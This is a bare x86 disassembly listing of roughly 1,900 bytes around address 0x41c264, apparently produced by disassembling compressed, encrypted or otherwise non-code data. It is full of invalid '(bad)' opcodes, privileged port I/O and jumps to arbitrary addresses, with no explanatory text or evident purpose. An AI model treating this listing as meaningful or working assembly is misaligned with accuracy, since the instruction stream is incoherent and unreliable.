  41c264:	adc    dh,BYTE PTR [esi+eiz*2+0x38]
  41c268:	scas   eax,DWORD PTR es:[edi]
  41c269:	adc    dh,BYTE PTR [esi+edx*1-0x16b372f8]
  41c270:	in     al,0x5
  41c272:	out    0x7c,al
  41c274:	jmp    0x41c23a
  41c276:	lds    esp,FWORD PTR [edx+0x13f2cbea]
  41c27c:	lahf   
  41c27d:	ja     0x41c240
  41c27f:	dec    edi
  41c280:	ret    
  41c281:	sub    BYTE PTR ds:0x7655231f,0xe7
  41c288:	mov    edi,0x279b2e5d
  41c28d:	jns    0x41c228
  41c28f:	outs   dx,BYTE PTR ds:[esi]
  41c290:	and    al,0x2
  41c292:	(bad)  
  41c293:	push   esi
  41c294:	int3   
  41c295:	stc    
  41c296:	or     bh,bh
  41c298:	bound  esi,QWORD PTR [edi-0x54e642a3]
  41c29e:	push   ds
  41c29f:	push   ecx
  41c2a0:	sub    DWORD PTR [ebx],edx
  41c2a2:	shl    DWORD PTR [ebx-0x25fca318],cl
  41c2a8:	jns    0x41c289
  41c2aa:	out    dx,eax
  41c2ab:	inc    ecx
  41c2ac:	push   0xfffffffd
  41c2ae:	in     eax,0x29
  41c2b0:	loopne 0x41c323
  41c2b2:	push   ds
  41c2b3:	cli    
  41c2b4:	xchg   ecx,eax
  41c2b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2b6:	adc    BYTE PTR [esi-0x63629b52],bl
  41c2bc:	jecxz  0x41c32a
  41c2be:	lds    ebx,FWORD PTR [edi+eax*1-0x94b87bf]
  41c2c5:	ret    0xd96e
  41c2c8:	retf   0xcf36
  41c2cb:	mov    bh,0xab
  41c2cd:	(bad)  
  41c2ce:	stc    
  41c2cf:	stos   BYTE PTR es:[edi],al
  41c2d0:	outs   dx,BYTE PTR ds:[esi]
  41c2d1:	rcl    DWORD PTR [ebx+0x9],cl
  41c2d4:	stos   DWORD PTR es:[edi],eax
  41c2d5:	mov    al,0x7c
  41c2d7:	mov    al,0x81
  41c2d9:	hlt    
  41c2da:	hlt    
  41c2db:	pop    esp
  41c2dc:	popf   
  41c2dd:	nop
  41c2de:	sub    BYTE PTR [ebx-0x59873e5f],bl
  41c2e4:	xchg   edx,eax
  41c2e5:	xchg   ebx,eax
  41c2e6:	sahf   
  41c2e7:	sbb    eax,0x5fecb087
  41c2ec:	test   eax,0xc9557d29
  41c2f1:	sbb    DWORD PTR [ebx],0x13090a67
  41c2f7:	mov    ds:0xed78e1ed,eax
  41c2fc:	out    dx,eax
  41c2fd:	sbb    eax,0x1deae4fd
  41c302:	mov    cx,0xb4b0
  41c306:	stos   BYTE PTR es:[edi],al
  41c307:	sub    al,0x44
  41c309:	(bad)  
  41c30a:	aad    0xdf
  41c30c:	pop    eax
  41c30d:	dec    ecx
  41c30e:	mov    dl,0x91
  41c310:	or     esi,DWORD PTR [ebx+eiz*2-0x2ff1e2b2]
  41c317:	xchg   edi,eax
  41c318:	jg     0x41c320
  41c31a:	das    
  41c31b:	push   ss
  41c31c:	sbb    cl,BYTE PTR [ecx]
  41c31e:	jl     0x41c2b3
  41c320:	loop   0x41c326
  41c322:	iret   
  41c323:	sub    ch,BYTE PTR [ecx]
  41c325:	or     ebp,DWORD PTR [eax+ecx*2]
  41c328:	mov    ebx,0xd56d46e8
  41c32d:	push   ds
  41c32e:	jp     0x41c395
  41c330:	pop    ebp
  41c331:	retf   0xe70e
  41c334:	mov    WORD PTR [esi-0x403c1218],fs
  41c33a:	(bad)  
  41c33b:	xor    al,0xc8
  41c33d:	pusha  
  41c33e:	in     eax,0x82
  41c340:	xchg   ebp,eax
  41c341:	(bad)  
  41c343:	mov    esp,0xcf71ceba
  41c348:	cmp    eax,0xe31e5f44
  41c34d:	push   esp
  41c34e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c34f:	jecxz  0x41c3bd
  41c351:	pop    eax
  41c352:	xchg   ebx,eax
  41c353:	popf   
  41c354:	nop
  41c355:	mov    bl,0xca
  41c357:	mov    al,0x69
  41c359:	mov    ds:0x72a7c706,al
  41c35e:	in     al,0x2e
  41c360:	and    BYTE PTR [edi],al
  41c362:	mov    al,ds:0xe10ab9e7
  41c367:	loopne 0x41c31b
  41c369:	pop    ecx
  41c36a:	icebp  
  41c36b:	das    
  41c36c:	bswap  esp
  41c36e:	and    DWORD PTR [edx],eax
  41c370:	sub    BYTE PTR [eax],0xba
  41c373:	xor    dl,BYTE PTR [ecx]
  41c375:	sub    eax,0x9a605ed
  41c37a:	add    BYTE PTR [ebp+0x762cb739],bl
  41c380:	xchg   ecx,eax
  41c381:	cmp    ch,BYTE PTR [edx-0xd]
  41c384:	jp     0x41c3f4
  41c386:	fwait
  41c387:	cs gs retf 
  41c38a:	inc    edi
  41c38b:	mov    DWORD PTR [edi+0x3dc7f7bb],edx
  41c391:	popa   
  41c392:	in     al,0x2
  41c394:	sub    BYTE PTR [eax+0xb77d76e],cl
  41c39a:	stc    
  41c39b:	bound  ebx,QWORD PTR [edx-0x2a3e8903]
  41c3a1:	sub    cl,dh
  41c3a3:	ficom  DWORD PTR [ebx+esi*1-0x6a]
  41c3a7:	inc    eax
  41c3a8:	pushf  
  41c3a9:	sub    eax,0xcd0ddacd
  41c3ae:	and    al,0xf6
  41c3b0:	stos   BYTE PTR es:[edi],al
  41c3b1:	mov    ds:0x750f2c32,al
  41c3b6:	pop    ebx
  41c3b7:	xor    al,0xc5
  41c3b9:	mov    BYTE PTR [esi-0x3a5e47f2],cl
  41c3bf:	scas   al,BYTE PTR es:[edi]
  41c3c0:	push   edi
  41c3c1:	retf   0x82c7
  41c3c4:	jns    0x41c3e5
  41c3c6:	loop   0x41c39b
  41c3c8:	mov    ah,0x13
  41c3ca:	leave  
  41c3cb:	(bad)  
  41c3cc:	in     al,dx
  41c3cd:	sbb    eax,0xe52793fc
  41c3d2:	imul   ecx,edi,0x2aacde97
  41c3d8:	aad    0xec
  41c3da:	mov    ebx,0x85857274
  41c3df:	iret   
  41c3e0:	and    BYTE PTR [eax-0x1cb06520],0xee
  41c3e7:	rcr    BYTE PTR [esi-0x15],cl
  41c3ea:	jge    0x41c3ee
  41c3ec:	cmp    ah,BYTE PTR [ebp-0x73]
  41c3ef:	sub    BYTE PTR [ecx-0x36],ah
  41c3f2:	mov    cl,0xd9
  41c3f4:	inc    ebp
  41c3f5:	jne    0x41c459
  41c3f7:	mov    esi,0x9e21a54
  41c3fc:	xchg   esp,eax
  41c3fd:	es add edx,esi
  41c400:	cmp    al,0x46
  41c402:	ins    DWORD PTR es:[edi],dx
  41c403:	aas    
  41c404:	add    al,0xef
  41c406:	mov    dh,0xf8
  41c408:	rcl    cl,0x60
  41c40b:	and    eax,0xa5087223
  41c410:	mov    ch,0xd4
  41c412:	pop    ds
  41c413:	ins    DWORD PTR es:[edi],dx
  41c414:	gs shl ecx,cl
  41c417:	(bad)  
  41c418:	popa   
  41c419:	jbe    0x41c435
  41c41b:	push   ecx
  41c41c:	ins    DWORD PTR es:[edi],dx
  41c41d:	xchg   edi,eax
  41c41e:	cs ins DWORD PTR es:[edi],dx
  41c420:	push   ds
  41c421:	aad    0xb5
  41c423:	dec    eax
  41c424:	cmp    ch,BYTE PTR [ecx+0x4b57dce1]
  41c42a:	dec    esi
  41c42b:	pop    esi
  41c42c:	xchg   BYTE PTR [ebp+esi*8+0x5f],cl
  41c430:	sub    al,BYTE PTR [esi+eax*8]
  41c433:	es mov cl,0xcf
  41c436:	add    DWORD PTR [eax-0x59],ecx
  41c439:	dec    esp
  41c43a:	cmp    DWORD PTR [ebx],esp
  41c43c:	mov    WORD PTR [edi],ss
  41c43e:	sub    DWORD PTR [eax+0x3b],esp
  41c441:	adc    dl,BYTE PTR [esi+0x7b1f7396]
  41c447:	ins    BYTE PTR es:[edi],dx
  41c448:	sbb    dl,BYTE PTR [ebp+0x78a82322]
  41c44e:	add    esp,DWORD PTR [eax+0x1768c3de]
  41c454:	or     WORD PTR [eiz*4+0x2820565d],bx
  41c45c:	jmp    0x41c46c
  41c45e:	stos   BYTE PTR es:[edi],al
  41c45f:	add    eax,0x2caabca7
  41c464:	aam    0xaf
  41c466:	pop    ds
  41c467:	dec    dl
  41c469:	rcl    DWORD PTR [esi-0x183ff4e],1
  41c46f:	pop    ebx
  41c470:	stc    
  41c471:	sbb    esp,DWORD PTR [esi-0x43]
  41c474:	cli    
  41c475:	push   ds
  41c476:	enter  0xca1c,0x67
  41c47a:	add    dl,0xd1
  41c47d:	retf   0x1b3b
  41c480:	sbb    eax,0xfa7c77e6
  41c485:	repnz jecxz 0x41c4b6
  41c488:	rcl    DWORD PTR [esi],cl
  41c48a:	inc    edx
  41c48b:	jle    0x41c4cf
  41c48d:	xchg   esp,eax
  41c48e:	push   esp
  41c48f:	(bad)  
  41c490:	aam    0x91
  41c492:	pusha  
  41c493:	dec    edx
  41c494:	push   ebx
  41c495:	bound  eax,QWORD PTR [edi*4+0x76ffdba0]
  41c49c:	and    eax,esp
  41c49e:	dec    esi
  41c49f:	sbb    eax,0xa2dfc02b
  41c4a4:	xchg   BYTE PTR [ecx-0x78cc7265],al
  41c4aa:	imul   edi,ebx,0x54
  41c4ad:	aaa    
  41c4ae:	or     BYTE PTR [esi-0x6],al
  41c4b1:	jmp    0x3a914210
  41c4b6:	xchg   edi,eax
  41c4b7:	(bad)  
  41c4b8:	retf   0x4b3d
  41c4bb:	(bad)  
  41c4bc:	lods   eax,DWORD PTR ds:[esi]
  41c4bd:	lods   eax,DWORD PTR ds:[esi]
  41c4be:	and    ah,BYTE PTR [ebp+0x9]
  41c4c1:	or     esp,DWORD PTR [edi+0x50cbae0e]
  41c4c7:	mov    eax,0x66f9de42
  41c4cc:	fldcw  WORD PTR [edi+edi*8+0x6f512cd0]
  41c4d3:	les    esp,FWORD PTR [edx+0x732be903]
  41c4d9:	in     al,0x2
  41c4db:	adc    ebp,DWORD PTR ds:0x5a12179f
  41c4e1:	jmp    0xf005c713
  41c4e6:	fbstp  TBYTE PTR [ecx-0xc]
  41c4e9:	mov    ah,0xe1
  41c4eb:	xchg   esp,eax
  41c4ec:	lods   al,BYTE PTR ds:[esi]
  41c4ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4ee:	pop    edx
  41c4ef:	xor    eax,0x39b713e8
  41c4f4:	neg    BYTE PTR [edi+0x643eb738]
  41c4fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4fb:	mov    ebx,0x15deeb23
  41c500:	mov    edi,0x50c84b7c
  41c505:	(bad)
  41c509:	lahf   
  41c50a:	neg    BYTE PTR ds:0x59ae7e46
  41c510:	dec    ecx
  41c511:	sahf   
  41c512:	jp     0x41c565
  41c514:	sub    eax,0x818b7c42
  41c519:	enter  0x5aa5,0x9e
  41c51d:	dec    bl
  41c51f:	rcl    DWORD PTR gs:[ebp+0x2894e732],1
  41c526:	or     cl,BYTE PTR [eax]
  41c528:	aad    0xa9
  41c52a:	mov    dl,0xa
  41c52c:	ffreep st(3)
  41c52e:	sub    edi,DWORD PTR [edx-0xc]
  41c531:	inc    ecx
  41c532:	push   esi
  41c533:	addr16 out 0x1f,eax
  41c536:	imul   ebx,DWORD PTR [esi],0xbd93904
  41c53c:	sti    
  41c53d:	(bad)  
  41c53e:	loopne 0x41c545
  41c540:	repz or dl,0x14
  41c544:	mov    esi,0x65bd9482
  41c549:	or     eax,0xedc632de
  41c54e:	inc    edi
  41c54f:	jnp    0x41c5c5
  41c551:	mov    ss,eax
  41c553:	test   eax,0x5c3f0783
  41c558:	add    eax,0xe1ad691
  41c55d:	jnp    0x41c595
  41c55f:	sbb    edi,ebx
  41c561:	mov    ds:0xdb858692,eax
  41c566:	mov    bh,0x7e
  41c568:	imul   ebp,DWORD PTR [esi],0xfbe0df16
  41c56e:	add    esi,DWORD PTR [ebx]
  41c570:	jle    0x41c593
  41c572:	je     0x41c549
  41c574:	mov    edx,0x7f7aac2f
  41c579:	jmp    0x41c525
  41c57b:	sbb    al,0x6c
  41c57d:	sbb    BYTE PTR ds:0xa41d9c44,0xd6
  41c584:	mov    ebx,0xb96cfd20
  41c589:	adc    esp,DWORD PTR [eax+0x1163a034]
  41c58f:	push   esi
  41c590:	pop    eax
  41c591:	pop    ss
  41c592:	sbb    eax,0xc452b3a6
  41c597:	push   ebp
  41c598:	iret   
  41c599:	cmp    eax,DWORD PTR [ecx]
  41c59b:	rol    BYTE PTR [esi-0x44],cl
  41c59e:	xchg   ebx,eax
  41c59f:	stos   BYTE PTR es:[edi],al
  41c5a0:	fcomp  DWORD PTR [edi]
  41c5a2:	iret   
  41c5a3:	and    eax,0x4f91c5cd
  41c5a8:	jae    0x41c5da
  41c5aa:	stos   BYTE PTR es:[edi],al
  41c5ab:	jp     0x41c5e2
  41c5ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5ae:	xor    al,0x4f
  41c5b0:	dec    ebp
  41c5b1:	pop    ebp
  41c5b2:	or     al,0xfa
  41c5b4:	neg    al
  41c5b6:	int    0xee
  41c5b8:	aas    
  41c5b9:	scas   al,BYTE PTR es:[edi]
  41c5ba:	mov    ds:0x4170af49,al
  41c5bf:	push   cs
  41c5c0:	and    eax,0x34f983f5
  41c5c5:	mov    esi,0xa9473e03
  41c5ca:	sub    esi,DWORD PTR [edi-0x34]
  41c5cd:	or     eax,0x8e45bd8e
  41c5d2:	mov    bl,0x66
  41c5d4:	cmp    al,0x28
  41c5d6:	add    esi,DWORD PTR [esi]
  41c5d8:	inc    esp
  41c5d9:	or     eax,0x6398452a
  41c5de:	pop    esi
  41c5df:	inc    esp
  41c5e0:	aas    
  41c5e1:	xchg   ch,al
  41c5e3:	nop
  41c5e4:	aam    0x94
  41c5e6:	push   ecx
  41c5e7:	fisttp QWORD PTR [edi-0x56]
  41c5ea:	stos   DWORD PTR es:[edi],eax
  41c5eb:	cdq    
  41c5ec:	push   ds
  41c5ed:	mov    bl,bl
  41c5ef:	lahf   
  41c5f0:	hlt    
  41c5f1:	iret   
  41c5f2:	cmp    BYTE PTR [eax+edx*8-0x49],dh
  41c5f6:	js     0x41c58b
  41c5f8:	inc    esp
  41c5f9:	fstp   QWORD PTR [edi-0x31]
  41c5fc:	xchg   ecx,eax
  41c5fd:	lods   al,BYTE PTR ds:[esi]
  41c5fe:	js     0x41c61e
  41c600:	sub    eax,0x4deefd2a
  41c605:	inc    edi
  41c606:	icebp  
  41c607:	xor    al,0x72
  41c609:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c60a:	shl    al,cl
  41c60c:	cdq    
  41c60d:	ins    DWORD PTR es:[edi],dx
  41c60e:	outs   dx,BYTE PTR ds:[esi]
  41c60f:	fdiv   QWORD PTR [edx+0x61693d53]
  41c615:	lock cdq 
  41c617:	fimul  DWORD PTR [ebx-0x47b0bbf9]
  41c61d:	int    0x6d
  41c61f:	fwait
  41c620:	into   
  41c621:	inc    edi
  41c622:	mov    dl,0xef
  41c624:	mov    ah,0x14
  41c626:	clc    
  41c627:	inc    eax
  41c628:	xor    bh,BYTE PTR [ebx]
  41c62a:	mov    ah,0xec
  41c62c:	or     BYTE PTR [ebp+0x4378f80b],dl
  41c632:	call   0x4b4496e0
  41c637:	je     0x41c5f8
  41c639:	jnp    0x41c654
  41c63b:	mov    ah,BYTE PTR [ecx-0x1769ad40]
  41c641:	jl     0x41c64d
  41c643:	data16 fs into 
  41c646:	lods   eax,DWORD PTR ds:[esi]
  41c647:	dec    edi
  41c648:	inc    esp
  41c649:	stos   DWORD PTR es:[edi],eax
  41c64a:	adc    eax,0x11a1d190
  41c64f:	jp     0x41c5f3
  41c651:	call   0xc072cc1d
  41c656:	shl    bl,1
  41c658:	sar    DWORD PTR [ecx+ebp*4-0x4c],1
  41c65c:	jmp    0x41c6d1
  41c65e:	jnp    0x41c6a5
  41c660:	mov    ds:0xa1024d08,eax
  41c665:	dec    esi
  41c666:	retfw  
  41c668:	adc    eax,esi
  41c66a:	dec    ebp
  41c66b:	imul   esi,DWORD PTR [ebx+0x708dc467],0xaa9877cf
  41c675:	cmp    DWORD PTR [esi+eax*1+0x30],0xffffffed
  41c67a:	shr    bh,1
  41c67c:	mov    dl,0xb7
  41c67e:	sbb    DWORD PTR [ebx+0x3b],edx
  41c681:	call   0x19be:0x761ef97c
  41c688:	mov    ds:0xc58d3b73,eax
  41c68d:	loopne 0x41c68f
  41c68f:	sub    bl,BYTE PTR [edx+eax*4]
  41c692:	int    0x5f
  41c694:	push   esp
  41c695:	mov    dl,0x4a
  41c697:	mov    ?,WORD PTR [ecx]
  41c699:	and    eax,0x3adf4fc9
  41c69e:	shr    BYTE PTR ds:0x67baa7e5,1
  41c6a4:	test   eax,0x1d6c3c4e
  41c6a9:	imul   ebp,DWORD PTR ds:0x45af,0x4b
  41c6af:	push   edi
  41c6b0:	mov    ah,BYTE PTR [edi]
  41c6b2:	in     eax,dx
  41c6b3:	dec    eax
  41c6b4:	xor    DWORD PTR [ebp+0x62dec806],eax
  41c6ba:	and    BYTE PTR [ecx+0x57],0xbe
  41c6be:	call   0xc05:0x4781b13f
  41c6c5:	or     al,0x1e
  41c6c7:	sub    al,0xae
  41c6c9:	popf   
  41c6ca:	shl    DWORD PTR [ecx+ebp*1],0xc7
  41c6ce:	into   
  41c6cf:	jecxz  0x41c660
  41c6d1:	js     0x41c719
  41c6d3:	pop    ebx
  41c6d4:	in     eax,dx
  41c6d5:	pop    ebp
  41c6d6:	xor    dh,BYTE PTR [eax]
  41c6d8:	sub    eax,0xa39dcf52
  41c6dd:	mov    esi,0x5365d257
  41c6e2:	shl    DWORD PTR [edi+eax*1],cl
  41c6e5:	test   DWORD PTR [esi+ecx*4],edx
  41c6e8:	xchg   DWORD PTR [ebp-0x6687d967],ecx
  41c6ee:	addr16 ret 0xa25d
  41c6f2:	in     al,dx
  41c6f3:	push   ebp
  41c6f4:	neg    BYTE PTR [ecx+0x69ae0caa]
  41c6fa:	es jno 0x41c72e
  41c6fd:	inc    edx
  41c6fe:	popa   
  41c6ff:	jae    0x41c73a
  41c701:	fadd   QWORD PTR [esp+edx*8-0x1d968a01]
  41c708:	sub    ebx,DWORD PTR [edx-0xafb89af]
  41c70e:	lods   eax,DWORD PTR ds:[esi]
  41c70f:	jecxz  0x41c725
  41c711:	or     eax,0xce5a52e6
  41c716:	dec    ebx
  41c717:	mov    esp,0x3678d5db
  41c71c:	mov    ecx,edx
  41c71e:	loop   0x41c6a7
  41c720:	sbb    eax,0xd576179
  41c725:	cmp    eax,0x722d5bc2
  41c72a:	push   edx
  41c72b:	fidivr WORD PTR [esi+esi*8-0x70]
  41c72f:	cwde   
  41c730:	ss push edi
  41c732:	stos   DWORD PTR es:[edi],eax
  41c733:	sbb    DWORD PTR [eax+0x2a6ed86f],eax
  41c739:	adc    al,0x20
  41c73b:	pop    ebp
  41c73c:	jecxz  0x41c7a5
  41c73e:	addr16 sbb eax,0x66a7c7e7
  41c744:	push   esp
  41c745:	jge    0x41c6e6
  41c747:	and    al,0x49
  41c749:	mov    esi,0xd0086e32
  41c74e:	test   DWORD PTR [ecx-0x55c6a4ee],esp
  41c754:	loopne 0x41c74c
  41c756:	into   
  41c757:	jge    0x41c6d9
  41c759:	mov    dh,0xd2
  41c75b:	add    ecx,DWORD PTR [edi-0xb3c4c16]
  41c761:	or     eax,0xa288bba5
  41c766:	xor    edi,DWORD PTR [eax-0x64998aa6]
  41c76c:	xchg   edi,eax
  41c76d:	mov    DWORD PTR [eax+eax*2-0x7edbc8b],ecx
  41c774:	mov    dh,0xf2
  41c776:	test   al,0x57
  41c778:	fs jmp 0x78fafb74
  41c77e:	or     ah,ch
  41c780:	mov    bh,0x22
  41c782:	cdq    
  41c783:	sub    BYTE PTR [ebx-0x34f8f6a6],ah
  41c789:	int    0xcf
  41c78b:	mov    cl,0xd8
  41c78d:	mov    bl,0xe9
  41c78f:	and    BYTE PTR [edx],0x6a
  41c792:	leave  
  41c793:	neg    bl
  41c795:	mov    cl,0xc4
  41c797:	or     BYTE PTR [eax],cl
  41c799:	test   cl,cl
  41c79b:	iret   
  41c79c:	or     eax,0xbe6c611d
  41c7a1:	icebp  
  41c7a2:	pop    ss
  41c7a3:	aas    
  41c7a4:	shl    dl,cl
  41c7a6:	(bad)  
  41c7a7:	fdivr  QWORD PTR [edi+ecx*8-0x152028f3]
  41c7ae:	cmp    dh,BYTE PTR [ecx]
  41c7b0:	pusha  
  41c7b1:	mov    edx,DWORD PTR [ebp+0x73e5f13a]
  41c7b7:	mov    esi,0x22c3c292
  41c7bc:	adc    BYTE PTR [edx+edi*8+0x4aa303b1],cl
  41c7c3:	xchg   ecx,eax
  41c7c4:	pusha  
  41c7c5:	fnstcw WORD PTR [edx]
  41c7c7:	push   es
  41c7c8:	imul   esp,DWORD PTR [ebx+0x69a1849],0x5db4dde5
  41c7d2:	lods   al,BYTE PTR ds:[esi]
  41c7d3:	out    0x2,al
  41c7d5:	pop    ds
  41c7d6:	adc    eax,0xf0bcc4c8
  41c7db:	and    dl,BYTE PTR [eax-0x6c]
  41c7de:	pop    es
  41c7df:	inc    esp
  41c7e0:	mov    ds:0xdb9063cd,al
  41c7e5:	shl    DWORD PTR [ecx+0x17],cl
  41c7e8:	in     eax,0xa4
  41c7ea:	xchg   esp,eax
  41c7eb:	pop    edx
  41c7ec:	add    eax,0x70973da5
  41c7f1:	inc    esp
  41c7f2:	push   cs
  41c7f3:	ins    DWORD PTR es:[edi],dx
  41c7f4:	jmp    0x8366:0x7ee170
  41c7fb:	leave  
  41c7fc:	lods   al,BYTE PTR ds:[esi]
  41c7fd:	and    eax,0xc39f485c
  41c802:	lock pusha 
  41c804:	icebp  
  41c805:	sub    BYTE PTR [esi+edi*4-0x4c7bea30],cl
  41c80c:	or     ebx,DWORD PTR [ecx-0x71]
  41c80f:	sbb    eax,0x93af65ef
  41c814:	mov    WORD PTR [edx+0x35],?
  41c817:	mov    dh,ah
  41c819:	pusha  
  41c81a:	loopne 0x41c7e7
  41c81c:	fst    QWORD PTR [ebp-0x26223dcf]
  41c822:	fdivr  DWORD PTR [ebx+0x5e]
  41c825:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c826:	cld    
  41c827:	mov    ecx,0x8cd390be
  41c82c:	shr    DWORD PTR [ecx+0x6a],1
  41c82f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c830:	imul   esi,DWORD PTR [ebx+0x3060ad9f],0x4757b883
  41c83a:	hlt    
  41c83b:	add    edi,DWORD PTR [ecx+esi*4+0x345cd867]
  41c842:	mov    eax,ds:0x150687cb
  41c847:	ror    BYTE PTR [eax+0x33551b06],cl
  41c84d:	xchg   edi,eax
  41c84e:	and    dh,BYTE PTR [ebx]
  41c850:	mov    ecx,0xf10849b8
  41c855:	pop    ss
  41c856:	loop   0x41c82b
  41c858:	(bad)  
  41c859:	mov    al,0x41
  41c85b:	(bad)
  41c85f:	pop    esp
  41c860:	add    ah,ch
  41c862:	sar    DWORD PTR [ebx+0x579510fe],cl
  41c868:	fcomp  st(7)
  41c86a:	cld    
  41c86b:	xchg   esi,eax
  41c86c:	jns    0x41c86a
  41c86e:	rcl    BYTE PTR [eax],cl
  41c870:	imul   ebp,DWORD PTR [ebp+0x37cd89fd],0xffffffc6
  41c877:	into   
  41c878:	sub    DWORD PTR [edx],eax
  41c87a:	popf   
  41c87b:	nop
  41c87c:	pop    ss
  41c87d:	dec    edi
  41c87e:	popf   
  41c87f:	fs iret 
  41c881:	dec    esi
  41c882:	lods   al,BYTE PTR ds:[esi]
  41c883:	(bad)
  41c886:	jne    0x41c8ac
  41c888:	mov    esi,0x76c329c3
  41c88d:	xchg   edx,eax
  41c88e:	and    eax,esi
  41c890:	mov    al,ds:0x130576a9
  41c895:	jmp    0x8c647e67
  41c89a:	clc    
  41c89b:	sub    esi,DWORD PTR [eax-0x48a7bfb4]
  41c8a1:	hlt    
  41c8a2:	dec    ebx
  41c8a3:	jecxz  0x41c848
  41c8a5:	jmp    0x712ad7db
  41c8aa:	or     DWORD PTR [ebx+0x3cb5f71b],ebx
  41c8b0:	and    esi,esi
  41c8b2:	inc    esi
  41c8b3:	xor    al,0x3d
  41c8b5:	add    eax,DWORD PTR [edx-0x17c865b4]
  41c8bb:	jl     0x41c86d
  41c8bd:	mov    esp,0x24700c07
  41c8c2:	mov    ch,0xa6
  41c8c4:	iret   
  41c8c5:	stos   BYTE PTR es:[edi],al
  41c8c6:	push   ecx
  41c8c7:	jo     0x41c857
  41c8c9:	mov    al,0x46
  41c8cb:	(bad)  
  41c8cc:	in     al,dx
  41c8cd:	inc    ecx
  41c8ce:	mov    WORD PTR [eax+0x5c851a2f],?
  41c8d4:	ret    
  41c8d5:	sub    eax,0x2bb00712
  41c8da:	je     0x41c8c4
  41c8dc:	(bad)  
  41c8dd:	push   esp
  41c8de:	adc    edi,0xb2c2e692
  41c8e4:	xchg   bh,dl
  41c8e6:	outs   dx,DWORD PTR ds:[esi]
  41c8e7:	lahf   
  41c8e8:	jecxz  0x41c8e5
  41c8ea:	mov    ch,0x86
  41c8ec:	imul   esp,eax,0x4a
  41c8ef:	lods   eax,DWORD PTR ds:[esi]
  41c8f0:	dec    esi
  41c8f1:	pop    esi
  41c8f2:	cld    
  41c8f3:	xor    BYTE PTR [ebx+0x60],ah
  41c8f6:	push   ebx
  41c8f7:	lock xor dl,al
  41c8fa:	test   DWORD PTR [ebp+0x1a],ecx
  41c8fd:	mov    ds:0x64e4dfed,eax
  41c902:	clc    
  41c903:	mov    ebp,0xbffae4e5
  41c908:	push   es
  41c909:	inc    eax
  41c90a:	loope  0x41c906
  41c90c:	push   ds
  41c90d:	jne    0x41c989
  41c90f:	inc    ecx
  41c910:	aas    
  41c911:	or     bl,BYTE PTR [ebp+0x79]
  41c914:	scas   al,BYTE PTR es:[edi]
  41c915:	aas    
  41c916:	push   cs
  41c917:	stos   BYTE PTR es:[edi],al
  41c918:	imul   ebx,DWORD PTR [ebx+0x4a9cb74f],0xffffffb7
  41c91f:	mov    ebx,0xf682d831
  41c924:	aas    
  41c925:	dec    edi
  41c926:	xchg   edx,eax
  41c927:	enter  0x1edf,0xc5
  41c92b:	push   edi
  41c92c:	jge    0x41c927
  41c92e:	iret   
  41c92f:	test   al,0x76
  41c931:	dec    ecx
  41c932:	and    BYTE PTR [edi+0x47],dh
  41c935:	xchg   ebp,eax
  41c936:	(bad)  
  41c937:	in     al,dx
  41c938:	push   ss
  41c939:	imul   eax,DWORD PTR [edi+0x7a],0x26
  41c93d:	lock add BYTE PTR [esp+ebx*1-0x47],dl
  41c942:	adc    al,0x65
  41c944:	iret   
  41c945:	shl    BYTE PTR [esi],0x9f
  41c948:	imul   BYTE PTR [edx-0x1bb2dc59]
  41c94e:	sub    eax,0x9e80d0ff
  41c953:	xor    DWORD PTR [edi],ebp
  41c955:	fisubr DWORD PTR ds:0xe22000e7
  41c95b:	sub    ecx,DWORD PTR ds:0x37c6e695
  41c961:	push   eax
  41c962:	xor    DWORD PTR [ecx+0x59b6655b],edi
  41c968:	imul   eax,DWORD PTR [edi+0xe],0xed85d71d
  41c96f:	out    0xc3,al
  41c971:	inc    esp
  41c972:	(bad)  
  41c973:	jp     0x41c934
  41c975:	adc    al,0xab
  41c977:	add    eax,0xbd3c3dbd
  41c97c:	xor    ch,BYTE PTR [ecx+0x2b]
  41c97f:	mov    DWORD PTR [edi+0x78],eax
  41c982:	dec    esp
  41c983:	xor    eax,0xe9ecbc2d
  41c988:	in     eax,0xb2
  41c98a:	(bad)  
  41c98b:	shr    DWORD PTR [edi],1
  41c98d:	mov    esi,0x3832514c
  41c992:	fxch   st(4)
  41c994:	ret    
  41c995:	call   DWORD PTR [edi]
  41c997:	mov    ah,bl
  41c999:	dec    esp
  41c99a:	jbe    0x41c99e
  41c99c:	sub    DWORD PTR [edx-0x57],0xffffffca
  41c9a0:	out    0xb1,eax
  41c9a2:	jle    0x41c979
  41c9a4:	fadd   st,st(6)
  41c9a6:	loopne 0x41c9c9
  41c9a8:	shr    al,0x7
  41c9ab:	or     BYTE PTR [eax+eiz*1-0x254dcfed],bh
  41c9b2:	aas    
  41c9b3:	ins    DWORD PTR es:[edi],dx
  41c9b4:	mov    BYTE PTR [ebp-0x4c5e6436],bl
  41c9ba:	adc    ah,dh
  41c9bc:	inc    esi
  41c9bd:	in     eax,dx
  41c9be:	bound  eax,QWORD PTR [esi+ecx*4]
  41c9c1:	jnp    0x41c954
  41c9c3:	mov    ah,0xc5
  41c9c5:	push   esi
  41c9c6:	leave  
  41c9c7:	xchg   ah,ch
  41c9c9:	outs   dx,DWORD PTR ds:[esi]
  41c9ca:	add    ebp,ebx
  41c9cc:	lods   eax,DWORD PTR ds:[esi]
  41c9cd:	sub    al,0x3a
  41c9cf:	xor    eax,0xe76c52f
  41c9d4:	jae    0x41ca46
  41c9d6:	xor    edi,eax
  41c9d8:	jg     0x41c9e9
  41c9da:	adc    dh,bh
  41c9dc:	inc    eax
  41c9dd:	mov    ch,0xda
  41c9df:	iret   
  41c9e0:	jo     0x41c99b
  41c9e2:	sub    al,0xe3
  41c9e4:	sbb    edx,DWORD PTR [ebp-0x4011f3a2]
  41c9ea:	mov    cl,0x98
  41c9ec:	lds    esi,FWORD PTR [edi]
  41c9ee:	lea    ebp,[ecx+0x3c2c7b35]
  41c9f4:	mov    edi,0x85db5a0d
  41c9f9:	daa    
  41c9fa:	jo     0x41c9b8
  41c9fc:	fdivr  QWORD PTR [ecx]
  41c9fe:	in     eax,0x42
  41ca00:	jb     0x41c9a8
  41ca02:	dec    eax
  41ca03:	mov    bl,0x1
  41ca05:	jmp    0x8aa38cb3
